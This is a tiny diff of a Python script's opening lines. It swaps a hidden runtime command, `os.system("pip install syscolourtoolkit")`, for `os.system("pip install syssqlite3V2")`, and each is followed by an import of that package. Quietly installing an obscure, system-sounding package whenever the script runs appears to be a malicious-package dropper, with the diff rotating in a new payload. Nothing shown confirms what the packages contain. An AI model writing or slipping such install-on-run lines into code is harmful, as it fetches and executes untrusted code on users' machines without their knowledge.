@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolourtoolkit")
-import syscolourtoolkit
+os.system("pip install syssqlite3V2")
+import syssqlite3V2
 from optparse import Option
 import requests
 import threading
